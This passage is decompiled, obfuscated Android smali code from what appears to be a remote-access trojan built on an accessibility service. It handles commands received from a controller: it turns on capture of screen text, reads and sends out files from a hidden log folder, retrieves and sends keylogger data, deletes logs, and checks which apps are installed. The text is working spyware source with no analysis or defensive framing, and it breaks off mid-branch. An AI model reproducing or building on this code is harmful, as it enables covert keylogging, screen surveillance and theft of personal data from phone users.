    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->isblocked:Ljava/lang/String;

    invoke-static {v0, v5, v4}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 1189
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v0, :cond_af

    .line 1190
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    const-string v5, "unBlock"

    const/4 v6, 0x0

    invoke-virtual {v0, v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->Treger(Ljava/lang/String;[Ljava/lang/String;)V
    :try_end_49
    .catch Ljava/lang/Exception; {:try_start_49 .. :try_end_49} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_49 .. :try_end_49} :catch_15

    goto/16 :goto_2a

    .line 1197
    :cond_60
    :try_start_4a
    aget-object v0, v10, v8

    const-string v5, "SCRD2<*>"

    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_4a
    .catch Ljava/lang/Exception; {:try_start_4a .. :try_end_4a} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4a .. :try_end_4a} :catch_15

    if-eqz v0, :cond_62

    .line 1199
    :try_start_4b
    aget-object v0, v10, v8

    const-string v5, "SCRD2<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "o"

    .line 1200
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_61

    .line 1201
    aget-object v0, p1, v3

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->SendSkilton:Ljava/lang/String;

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static {v0, v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    goto/16 :goto_2a

    .line 1204
    :cond_61
    aget-object v0, p1, v3

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->SendSkilton:Ljava/lang/String;

    invoke-static {v0, v5, v4}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/MySettings;->WriteBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V
    :try_end_4b
    .catch Ljava/lang/Exception; {:try_start_4b .. :try_end_4b} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4b .. :try_end_4b} :catch_15

    goto/16 :goto_2a

    .line 1209
    :cond_62
    :try_start_4c
    aget-object v0, v10, v8

    const-string v5, "SCRD<*>"

    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_4c
    .catch Ljava/lang/Exception; {:try_start_4c .. :try_end_4c} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4c .. :try_end_4c} :catch_15

    if-eqz v0, :cond_64

    .line 1211
    :try_start_4d
    aget-object v0, v10, v8

    const-string v5, "SCRD<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "o"

    .line 1212
    invoke-virtual {v0, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_63

    .line 1213
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v0, :cond_af

    .line 1214
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->SendScreenText:Ljava/lang/Boolean;

    goto/16 :goto_2a

    .line 1216
    :cond_63
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v0, :cond_af

    .line 1217
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sput-object v4, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->SendScreenText:Ljava/lang/Boolean;
    :try_end_4d
    .catch Ljava/lang/Exception; {:try_start_4d .. :try_end_4d} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4d .. :try_end_4d} :catch_15

    goto/16 :goto_2a

    .line 1222
    :cond_64
    :try_start_4e
    aget-object v0, v10, v8

    const-string v5, "rdall<*>"

    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_4e
    .catch Ljava/lang/Exception; {:try_start_4e .. :try_end_4e} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4e .. :try_end_4e} :catch_15

    if-eqz v0, :cond_68

    .line 1224
    :try_start_4f
    aget-object v0, v10, v8

    const-string v5, "rdall<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v5, "r"

    .line 1225
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_66

    .line 1226
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    .line 1227
    new-instance v5, Ljava/io/File;

    const-string v6, "/Config/sys/apps/log"

    invoke-direct {v5, v0, v6}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 1228
    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_af

    .line 1229
    invoke-virtual {v5}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v0

    array-length v5, v0

    const/4 v6, 0x0

    :goto_1e
    if-ge v6, v5, :cond_af

    aget-object v7, v0, v6

    .line 1230
    invoke-virtual {v7}, Ljava/io/File;->isDirectory()Z

    move-result v8

    if-nez v8, :cond_65

    .line 1231
    invoke-virtual {v7}, Ljava/io/File;->delete()Z

    :cond_65
    add-int/lit8 v6, v6, 0x1

    goto :goto_1e

    :cond_66
    const-string v5, "g"

    .line 1233
    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_af

    .line 1234
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    .line 1235
    new-instance v5, Ljava/io/File;

    const-string v6, "/Config/sys/apps/log"

    invoke-direct {v5, v0, v6}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 1236
    invoke-virtual {v5}, Ljava/io/File;->exists()Z

    move-result v0

    if-eqz v0, :cond_af

    .line 1237
    invoke-virtual {v5}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v0

    array-length v5, v0

    const/4 v6, 0x0

    :goto_1f
    if-ge v6, v5, :cond_af

    aget-object v7, v0, v6

    .line 1238
    invoke-virtual {v7}, Ljava/io/File;->isDirectory()Z

    move-result v8

    if-nez v8, :cond_67

    .line 1240
    sget-object v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    const-string v8, "wait"

    sput-object v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->OFK:Ljava/lang/String;

    .line 1241
    sget-object v8, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->AllLogs:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v10, "|"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v10, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-virtual {v10, v7}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->RDF(Ljava/io/File;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v7

    invoke-static {v8, v7}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    .line 1242
    sget-object v7, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sput-object v15, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->OFK:Ljava/lang/String;
    :try_end_4f
    .catch Ljava/lang/Exception; {:try_start_4f .. :try_end_4f} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4f .. :try_end_4f} :catch_15

    :cond_67
    add-int/lit8 v6, v6, 0x1

    goto :goto_1f

    .line 1251
    :cond_68
    :try_start_50
    aget-object v0, v10, v8

    const-string v5, "rdd<*>"

    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_50
    .catch Ljava/lang/Exception; {:try_start_50 .. :try_end_50} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_50 .. :try_end_50} :catch_15

    if-eqz v0, :cond_69

    .line 1254
    :try_start_51
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    const-string v0, "wait"

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->OFK:Ljava/lang/String;

    const-string v0, "yyyy-MM-dd"

    .line 1255
    new-instance v5, Ljava/util/Date;

    invoke-direct {v5}, Ljava/util/Date;-><init>()V

    invoke-static {v0, v5}, Landroid/text/format/DateFormat;->format(Ljava/lang/CharSequence;Ljava/util/Date;)Ljava/lang/CharSequence;

    move-result-object v0

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    .line 1256
    aget-object v0, v10, v8

    const-string v5, "rdd<*>"

    invoke-virtual {v0, v5, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->Dele(Ljava/lang/String;)V

    .line 1258
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sput-object v15, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->OFK:Ljava/lang/String;
    :try_end_51
    .catch Ljava/lang/Exception; {:try_start_51 .. :try_end_51} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_51 .. :try_end_51} :catch_15

    goto/16 :goto_2a

    .line 1262
    :cond_69
    :try_start_52
    aget-object v0, v10, v8

    const-string v5, "rd<*>"

    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_52
    .catch Ljava/lang/Exception; {:try_start_52 .. :try_end_52} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_52 .. :try_end_52} :catch_15

    if-eqz v0, :cond_6a

    .line 1265
    :try_start_53
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    const-string v0, "wait"

    sput-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->OFK:Ljava/lang/String;

    .line 1267
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->getkeylog:Ljava/lang/String;

    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    aget-object v6, v10, v8

    const-string v7, "rd<*>"

    invoke-virtual {v6, v7, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->RD(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    .line 1268
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    sput-object v15, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;->OFK:Ljava/lang/String;
    :try_end_53
    .catch Ljava/lang/Exception; {:try_start_53 .. :try_end_53} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_53 .. :try_end_53} :catch_15

    goto/16 :goto_2a

    .line 1273
    :cond_6a
    :try_start_54
    aget-object v0, v10, v8

    const-string v5, "MO<*>"

    invoke-virtual {v0, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0
    :try_end_54
    .catch Ljava/lang/Exception; {:try_start_54 .. :try_end_54} :catch_15
    .catch Ljava/lang/OutOfMemoryError; {:try_start_54 .. :try_end_54} :catch_15

    const-string v5, ">"

    if-eqz v0, :cond_7d

    .line 1275
    :try_start_55
    sget-object v0, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/initializeService;->MyAccess:L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    if-eqz v0, :cond_af

    .line 1276
    aget-object v0, v10, v8

    const-string v9, "MO<*>"

    invoke-virtual {v0, v9, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 1277
    aget-object v9, v0, v3

    invoke-virtual {v9}, Ljava/lang/String;->hashCode()I

    move-result v10

    const/16 v12, 0x41

    if-eq v10, v12, :cond_70

    const/16 v12, 0x44

    if-eq v10, v12, :cond_6f

    const/16 v12, 0x47

    if-eq v10, v12, :cond_6e

    const/16 v12, 0x4c

    if-eq v10, v12, :cond_6d

    const/16 v12, 0x52

    if-eq v10, v12, :cond_6c

    const/16 v12, 0x53

    if-eq v10, v12, :cond_6b

    goto :goto_20

    :cond_6b
    const-string v10, "S"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_71

    const/4 v6, 0x2

    goto :goto_20

    :cond_6c
    const-string v10, "R"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_71

    const/4 v6, 0x4

    goto :goto_20

    :cond_6d
    const-string v10, "L"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_71

    const/4 v6, 0x0

    goto :goto_20

    :cond_6e
    const-string v10, "G"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_71

    const/4 v6, 0x1

    goto :goto_20

    :cond_6f
    const-string v10, "D"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_71

    const/4 v6, 0x5

    goto :goto_20

    :cond_70
    const-string v10, "A"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_71

    const/4 v6, 0x3

    :cond_71
    :goto_20
    if-eqz v6, :cond_7a

    if-eq v6, v8, :cond_79

    if-eq v6, v7, :cond_77

    const/4 v5, 0x3

    if-eq v6, v5, :cond_75

    const/4 v5, 0x4

    if-eq v6, v5, :cond_73

    const/4 v5, 0x5

    if-eq v6, v5, :cond_72

    goto/16 :goto_2a

    .line 1354
    :cond_72
    aget-object v5, v0, v8

    aget-object v0, v0, v7

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->ClearSnaps(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_2a

    .line 1346
    :cond_73
    aget-object v5, v0, v8

    invoke-static {v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->ReamoveActivity(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v5

    .line 1347
    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_74

    .line 1348
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->Tracker:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "R!OK#"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v0, v0, v8

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1350
    :cond_74
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->Tracker:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "R!NO#"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v0, v0, v8

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    .line 1334
    :cond_75
    aget-object v0, v0, v8

    .line 1335
    aget-object v5, p1, v3

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->isAppInstalledWithPackage(Ljava/lang/String;Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_76

    .line 1336
